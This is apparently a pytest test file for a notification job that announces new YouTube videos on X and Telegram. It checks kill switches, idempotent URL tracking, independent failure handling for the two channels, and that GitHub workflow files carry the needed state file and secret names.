def test_x_is_a_no_op_when_switched_off_or_unconfigured(monkeypatch, capsys):
    """F.3 #3/#11: the seam costs nothing until the owner creates the app, and the
    kill switch must be flippable from Actions (fv.flag, not fv.setting)."""
    calls = []
    monkeypatch.setattr(notify.requests, "post", lambda *a, **k: calls.append(1))
    _no_x(monkeypatch)
    notify._post_x()
    assert calls == [] and "X not configured" in capsys.readouterr().out

    # three of four is still unconfigured — a partial credential set is not a post
    for i in range(4):
        _with_x(monkeypatch)
        monkeypatch.setenv(_X_ENV[i], "")
        notify._post_x()
        assert calls == [], _X_ENV[i]
    assert "X not configured" in capsys.readouterr().out

    _with_x(monkeypatch)
    monkeypatch.setenv("TWITTER", "false")               # a string env var, not a bool
    assert notify.x_enabled() is False
    notify._post_x()
    assert calls == [] and "disabled by config" in capsys.readouterr().out
    monkeypatch.delenv("TWITTER")
    with pytest.MonkeyPatch.context() as mp:
        mp.setattr(notify.fv, "setting", _settings(twitter="false"))
        assert notify.x_enabled() is False                # a string in config.json too


def test_x_records_a_url_only_after_a_successful_post(monkeypatch, tmp_path, capsys):
    """The idempotence contract, per surface: post once, remember it, never post it
    twice — and on a failure remember NOTHING, so the next firing may still try."""
    runs = tmp_path / "runs.jsonl"
    now = _dt.datetime.utcnow().isoformat(timespec="seconds")
    runs.write_text(json.dumps(_row(publish_at=now, timestamp=now)) + "\n", encoding="utf-8")
    monkeypatch.setattr(notify, "RUNS_LOG", runs)
    monkeypatch.setattr(notify, "NOTIFIED_X", tmp_path / "notified_x.json")
    monkeypatch.setattr(notify.site, "CATALOG", tmp_path / "cat.json")
    monkeypatch.setattr(notify.fv, "setting", _settings(twitter=True))
    _with_x(monkeypatch)

    sent = []
    monkeypatch.setattr(notify, "send_x", lambda text, secrets=None: sent.append(text) or False)
    notify._post_x()
    assert len(sent) == 1 and not (tmp_path / "notified_x.json").exists()

    monkeypatch.setattr(notify, "send_x", lambda text, secrets=None: sent.append(text) or True)
    notify._post_x()
    assert notify.load_notified(tmp_path / "notified_x.json") == \
        ["https://youtube.com/watch?v=ABCDEFGHIJK"]
    assert "X: posted" in capsys.readouterr().out

    notify._post_x()                                     # second firing: already sent
    assert len(sent) == 2 and "X: nothing new to post" in capsys.readouterr().out


def test_the_two_surfaces_never_take_each_other_down(monkeypatch, tmp_path, capsys):
    """One broken or unconfigured surface must not cost the other its post — and
    they must not share a notified list, or Telegram taking a video would mark it
    done for X, which would then never post it at all."""
    runs = tmp_path / "runs.jsonl"
    now = _dt.datetime.utcnow().isoformat(timespec="seconds")
    runs.write_text(json.dumps(_row(publish_at=now, timestamp=now)) + "\n", encoding="utf-8")
    monkeypatch.setattr(notify, "RUNS_LOG", runs)
    monkeypatch.setattr(notify, "NOTIFIED", tmp_path / "tg.json")
    monkeypatch.setattr(notify, "NOTIFIED_X", tmp_path / "x.json")
    monkeypatch.setattr(notify.site, "CATALOG", tmp_path / "cat.json")
    monkeypatch.setattr(notify.fv, "setting", _settings(telegram=True, twitter=True))
    monkeypatch.setenv("TELEGRAM_BOT_TOKEN", "T")
    monkeypatch.setenv("TELEGRAM_CHAT_ID", "@c")
    monkeypatch.delenv("TELEGRAM", raising=False)
    _with_x(monkeypatch)

    # Telegram explodes at every seam; X still posts, and vice versa
    x_sent, tg_sent = [], []
    monkeypatch.setattr(notify, "send_x", lambda t, secrets=None: x_sent.append(t) or True)
    for name in ("enabled", "_token", "format_message", "send"):
        before = len(x_sent)
        with pytest.MonkeyPatch.context() as mp:
            mp.setattr(notify, name, _raiser(name))
            assert notify.main() == 0, name
            assert len(x_sent) == before + 1, name
            (tmp_path / "x.json").unlink()               # let X be eligible again

    monkeypatch.setattr(notify, "send", lambda text, link="": tg_sent.append(text) or True)
    with pytest.MonkeyPatch.context() as mp:
        mp.setattr(notify, "send_x", _raiser("send_x"))
        assert notify.main() == 0
        assert len(tg_sent) == 1
    out = capsys.readouterr().out
    assert "telegram failed" in out and "x failed" in out

    # the two lists are independent: the URL Telegram just took is still eligible
    # for X, because X reads its own file
    assert notify.load_notified(tmp_path / "tg.json") == \
        ["https://youtube.com/watch?v=ABCDEFGHIJK"]
    assert notify.load_notified(tmp_path / "x.json") == []
    before = len(x_sent)
    assert notify.main() == 0 and len(x_sent) == before + 1   # X posts; Telegram no-ops
    assert "Telegram: nothing new to post" in capsys.readouterr().out


def test_x_main_never_raises_and_never_fails_the_workflow(monkeypatch):
    """An unattended announcement job that exits non-zero turns the repo red for a
    post nobody missed. Every seam is stubbed to raise; main() still returns 0."""
    monkeypatch.delenv("TELEGRAM_BOT_TOKEN", raising=False)
    monkeypatch.delenv("TELEGRAM_CHAT_ID", raising=False)
    _with_x(monkeypatch)
    for name in ("load_notified", "load_rows", "pick_row", "catalog_entry",
                 "format_post", "send_x", "save_notified", "_x_secrets", "x_enabled"):
        with pytest.MonkeyPatch.context() as mp:
            mp.setattr(notify.fv, "setting", _settings(twitter=True))
            mp.setattr(notify, name, _raiser(name))
            assert notify.main() == 0, name


def test_x_state_gets_the_both_halves_treatment():
    """The standing trap, now twice: a tracked file the run writes must be in BOTH
    state_merge.FILES and every workflow's stash list, or `checkout -B main
    origin/main` reverts it silently and every day re-posts the same video."""
    assert "state/notified_x.json" in sm.FILES
    root = Path(__file__).resolve().parents[1]
    pub = (root / ".github/workflows/publish.yml").read_text(encoding="utf-8")
    nyml = (root / ".github/workflows/notify.yml").read_text(encoding="utf-8")
    assert "state/notified_x.json" in pub and "state/notified_x.json" in nyml
    # the post must happen BEFORE the state-save, or the URL is never remembered
    assert nyml.index("python -m factverse.notify") < nyml.index("python -m factverse.state_merge")
    # all four secrets reach the job, or the seam silently never posts
    for secret in ("X_API_KEY", "X_API_SECRET", "X_ACCESS_TOKEN", "X_ACCESS_SECRET"):
        assert f"secrets.{secret}" in nyml, secret
    merged = json.loads(sm.merge_file("state/notified_x.json",
                                      json.dumps(["a", "b"]), json.dumps(["b", "c"])))
    assert sorted(merged) == ["a", "b", "c"]
    for junk in ("42", "null", '"str"', "{}"):
        assert sm.merge_file("state/notified_x.json", junk, json.dumps(["a"])) is not None
    # and the kill switch exists in both config files under the name notify reads
    for name in ("config.json", "config.example.json"):
        assert '"twitter"' in (root / name).read_text(encoding="utf-8"), name
